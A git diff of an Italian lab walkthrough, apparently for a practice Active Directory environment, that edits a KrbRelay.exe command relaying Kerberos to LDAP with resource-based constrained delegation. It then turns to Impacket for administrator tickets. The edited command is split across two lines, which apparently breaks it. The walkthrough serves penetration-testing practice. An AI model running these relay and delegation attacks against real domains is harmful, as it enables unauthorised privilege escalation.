@@ -467,7 +467,8 @@ Usiamo il modulo di OleViewDotNet per trovare il clsid
 Usa la guida presente sul github di KrbRelay (Sono andato a tentativi, nel mio caso ho usato altri nella lista forniti dal github)
 Lanciamo KrbRelay.exe
 ```powershell
-.\KrbRelay.exe -spn ldap/winterfell.north.sevenkingdoms.local -clsid 354ff91b-5e49-4bdc-a8e6-1cb6c6877182 -rbcd S-1-5-21-585350295-1285882793-2068218167-5103 -port 443
+.\KrbRelay.exe -spn ldap/winterfell.north.sevenkingdoms.local -clsid
+38e441fb-3d16-422f-8750-b2dacec5cefc -rbcd S-1-5-21-585350295-1285882793-2068218167-5103 -port 443
 ```
 ![[Pasted image 20230906150422.png]]
 Ora usiamo Impacket per ottenere un TGT e poi un ST per l'account da amministratore
